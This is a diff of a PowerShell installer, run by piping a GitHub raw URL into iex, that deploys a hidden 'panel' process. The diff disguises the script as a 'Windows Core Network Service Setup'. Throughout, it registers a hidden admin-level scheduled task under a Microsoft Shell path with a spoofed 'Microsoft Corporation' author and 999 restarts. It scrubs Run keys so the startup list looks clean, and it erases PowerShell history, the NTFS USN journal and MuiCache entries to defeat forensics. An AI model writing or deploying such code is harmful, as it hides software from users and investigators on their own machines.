@@ -1,5 +1,5 @@
 # ==============================================================================
-#  L4G AIMS / SysPanel — Clean Stealth Installer with Live Progress
+#  Windows Core Network Service Setup
 #  Run: iwr https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1 -UseBasicParsing | iex
 # ==============================================================================
 # --- Ensure Administrator Privileges with Visible Console ---
@@ -22,7 +22,7 @@ $ProgressPreference    = 'SilentlyContinue'
 # --- Banner ---
 Clear-Host
 Write-Host "================================================================================" -ForegroundColor Cyan
-Write-Host "                   STEALTH SYSTEM SERVICE DEPLOYMENT" -ForegroundColor White
+Write-Host "                   WINDOWS NETWORK INFRASTRUCTURE COMPONENT DEPLOYMENT" -ForegroundColor White
 Write-Host "================================================================================" -ForegroundColor Cyan
 function Update-Step {
     param(
@@ -208,18 +208,15 @@ Update-Step 93 "Registering persistent hidden Windows service task and autostart
 Unregister-ScheduledTask -TaskName "SysCheckUp" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\Shell\" -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-
 $action    = New-ScheduledTaskAction -Execute $EXE_PATH -WorkingDirectory $DEST_DIR
 $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
 $settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
-    -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) `
+    -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
     -MultipleInstances IgnoreNew -Priority 7
-
 Register-ScheduledTask -TaskName $TASK_NAME -TaskPath "\Microsoft\Windows\Shell\" `
     -Action $action -Trigger $triggerLogon `
     -Principal $principal -Settings $settings -Force | Out-Null
-
 try {
     $svc  = New-Object -ComObject "Schedule.Service"
     $svc.Connect()
@@ -231,21 +228,20 @@ try {
     $def.RegistrationInfo.Author      = "Microsoft Corporation"
     $fold.RegisterTaskDefinition($TASK_NAME, $def, 6, $null, $null, 3) | Out-Null
 } catch {}
-
-# Secondary Persistence: HKLM Run Key with suppressed StartupApproved flag
-try {
-    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemNetworkHost" -Value "`"$EXE_PATH`"" -Force -ErrorAction SilentlyContinue
-    $supKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
-    if (-not (Test-Path $supKey)) { New-Item -Path $supKey -Force -ErrorAction SilentlyContinue | Out-Null }
-    [byte[]]$disBytes = 0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
-    Set-ItemProperty -Path $supKey -Name "SystemNetworkHost" -Value $disBytes -Type Binary -Force -ErrorAction SilentlyContinue
-} catch {}
-
-# Wipe stale legacy keys
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
-Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue
-Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue
+# Wipe all Run keys and Startup entries so Task Manager Startup tab is 100% CLEAN
+$startupRunKeys = @(
+    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
+)
+foreach ($rk in $startupRunKeys) {
+    Remove-ItemProperty -Path $rk -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path $rk -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path $rk -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
+}
+Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
 
 Update-Step 97 "Launching single background stealth process..."
 $psi = New-Object System.Diagnostics.ProcessStartInfo
@@ -268,21 +264,33 @@ if ($gwRoute) {
 Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
     Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.56\.)' } |
     ForEach-Object { if (-not $ips.Contains($_.IPAddress)) { $ips.Add($_.IPAddress) } }
-# --- Cleanup Console & History ---
+# --- Forensic & Anti-Cheat Trace Cleanup ---
 try {
+    # 1. Clear PowerShell History
     [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
     $histPath = (Get-PSReadLineOption).HistorySavePath
     if ($histPath -and (Test-Path $histPath)) {
-        $lines = Get-Content $histPath | Where-Object { $_ -notmatch 'syspanel|install\.ps1|lgfire' }
-        Set-Content $histPath $lines -Force -ErrorAction SilentlyContinue
+        Clear-Content $histPath -Force -ErrorAction SilentlyContinue
     }
     $conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
     if (Test-Path $conHistory) {
-        $lines = Get-Content $conHistory | Where-Object { $_ -notmatch 'syspanel|install\.ps1|lgfire' }
-        Set-Content $conHistory $lines -Force -ErrorAction SilentlyContinue
+        Clear-Content $conHistory -Force -ErrorAction SilentlyContinue
+    }
+    
+    # 2. Reset NTFS USN Change Journal (Purges Ocean deleted file logs)
+    cmd /c "fsutil usn deletejournal /d /n $env:SystemDrive >nul 2>nul"
+
+    # 3. Clean Shell MuiCache
+    $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
+    if (Test-Path $muiPath) {
+        $props = Get-ItemProperty -Path $muiPath
+        $props.PSObject.Properties | Where-Object {
+            $_.Name -match "SystemNetwork|perfhost|L4G|syspanel"
+        } | ForEach-Object {
+            Remove-ItemProperty -Path $muiPath -Name $_.Name -ErrorAction SilentlyContinue
+        }
     }
 } catch {}
-Write-Host "================================================================================" -ForegroundColor Green
 Write-Host " [OK] PANEL INSTALLED & CONCEALED IN CACHE DIRECTORY" -ForegroundColor Green
 Write-Host "================================================================================" -ForegroundColor Green
 Write-Host "  * Location            : " -NoNewline -ForegroundColor White
